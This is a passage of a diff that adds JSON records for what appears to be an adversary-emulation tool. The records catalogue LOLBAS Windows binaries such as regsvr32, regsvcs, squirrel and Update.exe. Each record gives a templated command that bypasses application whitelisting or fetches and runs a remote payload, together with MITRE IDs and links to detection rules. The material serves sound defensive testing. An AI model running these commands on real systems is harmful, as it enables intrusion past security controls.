+            "Splunk": "https://github.com/splunk/security_content/blob/bc93e670f5dcb24e96fbe3664d6bcad92df5acad/docs/_stories/suspicious_regsvcs_regasm_activity.md"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_regasm_with_network_connection.yml"
+          },
+          {
+            "IOC": "regasm.exe executing dll file"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL (.NET)"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Regasm.yml:0:0",
+        "source_tcodes": [
+          "T1218.009"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Local Admin."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Regsvcs.yml:0:1",
+      "name": "LOLBAS - T1218.009 - Regsvcs.exe - AWL Bypass - Execute dll file and bypass Application whitelisting [95e2dca]",
+      "description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Loads the target .NET DLL file and executes the RegisterClass function. Use case: Execute dll file and bypass Application whitelisting. Privilege: Local Admin.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.009",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "regsvcs.exe #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Regsvcs.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvcs.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Regsvcs.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Execute dll file and bypass Application whitelisting",
+        "privileges": "Local Admin",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1218.009",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\RegSvcs.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\RegSvcs.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/",
+          "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/",
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.md"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_regasm.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_regsvcs_with_network_connection.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL (.NET)"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Regsvcs.yml:0:1",
+        "source_tcodes": [
+          "T1218.009"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Local Admin."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Regsvr32.yml:0:0",
+      "name": "LOLBAS - T1218.010 - Regsvr32.exe - AWL Bypass - Execute code from remote scriptlet, bypass Application whitelisting [b4f92dc]",
+      "description": "Used by Windows to register dlls. Execute the specified remote .SCT script with scrobj.dll. Use case: Execute code from remote scriptlet, bypass Application whitelisting. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.010",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "regsvr32 /s /n /u /i:#{lotl_lolbas_remote_url} scrobj.dll",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Regsvr32.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Regsvr32.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute code from remote scriptlet, bypass Application whitelisting",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1218.010",
+        "full_paths": [
+          "C:\\Windows\\System32\\regsvr32.exe",
+          "C:\\Windows\\SysWOW64\\regsvr32.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/",
+          "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/",
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml"
+          },
+          {
+            "IOC": "regsvr32.exe retrieving files from Internet"
+          },
+          {
+            "IOC": "regsvr32.exe executing scriptlet (sct) files"
+          },
+          {
+            "IOC": "DotNet CLR libraries loaded into regsvr32.exe"
+          },
+          {
+            "IOC": "DotNet CLR Usage Log - regsvr32.exe.log"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "SCT"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Regsvr32.yml:0:0",
+        "source_tcodes": [
+          "T1218.010"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Regsvr32.yml:0:1",
+      "name": "LOLBAS - T1218.010 - Regsvr32.exe - AWL Bypass - Execute code from scriptlet, bypass Application whitelisting [014a4b6]",
+      "description": "Used by Windows to register dlls. Execute the specified local .SCT script with scrobj.dll. Use case: Execute code from scriptlet, bypass Application whitelisting. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.010",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "regsvr32.exe /s /u /i:#{lotl_lolbas_payload_path} scrobj.dll",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Regsvr32.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Regsvr32.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Execute code from scriptlet, bypass Application whitelisting",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1218.010",
+        "full_paths": [
+          "C:\\Windows\\System32\\regsvr32.exe",
+          "C:\\Windows\\SysWOW64\\regsvr32.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/",
+          "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/",
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml"
+          },
+          {
+            "IOC": "regsvr32.exe retrieving files from Internet"
+          },
+          {
+            "IOC": "regsvr32.exe executing scriptlet (sct) files"
+          },
+          {
+            "IOC": "DotNet CLR libraries loaded into regsvr32.exe"
+          },
+          {
+            "IOC": "DotNet CLR Usage Log - regsvr32.exe.log"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "SCT"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Regsvr32.yml:0:1",
+        "source_tcodes": [
+          "T1218.010"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Remote.yml:0:0",
+      "name": "LOLBAS - T1127 - Remote.exe - AWL Bypass - Executes a process under a trusted Microsoft signed binary [1841e74]",
+      "description": "Debugging tool included with Windows Debugging Tools. Spawns specified executable as a child process of remote.exe Use case: Executes a process under a trusted Microsoft signed binary. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Remote.exe /s #{lotl_lolbas_payload_path} anythinghere",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Remote.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Remote.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Executes a process under a trusted Microsoft signed binary",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\remote.exe",
+          "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\remote.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/"
+        ],
+        "detection": [
+          {
+            "IOC": "remote.exe process spawns"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "EXE"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Remote.yml:0:0",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Setupapi.yml:0:0",
+      "name": "LOLBAS - T1218.011 - Setupapi.dll - AWL Bypass - Run local or remote script(let) code through INF file specification. [dcddf06]",
+      "description": "Windows Setup Application Programming Interface. Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Use case: Run local or remote script(let) code through INF file specification.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.011",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Setupapi.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Setupapi.dll",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification.",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1218.011",
+        "full_paths": [
+          "c:\\windows\\system32\\setupapi.dll",
+          "c:\\windows\\syswow64\\setupapi.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://github.com/huntresslabs/evading-autoruns",
+          "https://twitter.com/pabraeken/status/994742106852941825",
+          "https://windows10dll.nirsoft.net/setupapi_dll.html"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_rundll32_setupapi_installhinfsection.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___setupapi.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Setupapi.yml:0:0",
+        "source_tcodes": [
+          "T1218.011"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Squirrel.yml:0:1",
+      "name": "LOLBAS - T1218 - Squirrel.exe - AWL Bypass - Download and execute binary [98fb497]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. The above binary will go to url and look for RELEASES file, download and install the nuget package. Use case: Download and execute binary. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "squirrel.exe --update #{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Squirrel.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Squirrel.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "Nuget"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Squirrel.yml:0:1",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Squirrel.yml:0:3",
+      "name": "LOLBAS - T1218 - Squirrel.exe - AWL Bypass - Download and execute binary [65e398a]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. The above binary will go to url and look for RELEASES file, download and install the nuget package. Use case: Download and execute binary. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "squirrel.exe --updateRollback=#{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Squirrel.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Squirrel.exe",
+        "command_index": 3,
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "Nuget"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Squirrel.yml:0:3",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Syssetup.yml:0:0",
+      "name": "LOLBAS - T1218.011 - Syssetup.dll - AWL Bypass - Run local or remote script(let) code through INF file specification (Note May pop an er... [5f59567]",
+      "description": "Windows NT System Setup. Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Use case: Run local or remote script(let) code through INF file specification (Note May pop an error window).. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.011",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Syssetup.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Syssetup.dll",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification (Note May pop an error window).",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1218.011",
+        "full_paths": [
+          "c:\\windows\\system32\\syssetup.dll",
+          "c:\\windows\\syswow64\\syssetup.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/pabraeken/status/994392481927258113",
+          "https://twitter.com/harr0ey/status/975350238184697857",
+          "https://twitter.com/bohops/status/975549525938135040",
+          "https://windows10dll.nirsoft.net/syssetup_dll.html"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Syssetup.yml:0:0",
+        "source_tcodes": [
+          "T1218.011"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Tracker.yml:0:1",
+      "name": "LOLBAS - T1127 - Tracker.exe - AWL Bypass - Injection of locally stored DLL file into target process. [f360e32]",
+      "description": "Tool included with Microsoft .Net Framework.. Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. Use case: Injection of locally stored DLL file into target process.. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Tracker.exe /d #{lotl_lolbas_payload_path} /c C:\\Windows\\write.exe",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Tracker.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Tracker.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Injection of locally stored DLL file into target process.",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/subTee/status/793151392185589760",
+          "https://attack.mitre.org/wiki/Execution"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_tracker.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Tracker.yml:0:1",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Update.yml:0:7",
+      "name": "LOLBAS - T1218 - Update.exe - AWL Bypass - Application Whitelisting Bypass [a2687ef]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied. Use case: Application Whitelisting Bypass. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Update.exe --processStart #{lotl_lolbas_payload_path} --process-start-args \"#{lotl_lolbas_command}\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path",
+        "lotl_lolbas_command"
+      ],
+      "required_assets": [],
+      "operational_risk": "interact",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Update.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Update.exe",
+        "command_index": 7,
+        "category": "AWL Bypass",
+        "usecase": "Application Whitelisting Bypass",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with Microsoft Teams installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=rOP3hnkj7ls",
+          "https://twitter.com/reegun21/status/1144182772623269889",
+          "https://twitter.com/MrUn1k0d3r/status/1143928885211537408",
+          "https://twitter.com/reegun21/status/1291005287034281990",
+          "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/",
+          "https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12",
+          "https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56",
+          "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml"
+          },
+          {
+            "IOC": "Update.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CMD"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Update.yml:0:7",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Update.yml:0:3",
+      "name": "LOLBAS - T1218 - Update.exe - AWL Bypass - Download and execute binary [b017d10]",
+      "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA. Use case: Download and execute binary. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Update.exe --update=#{lotl_lolbas_remote_host}",
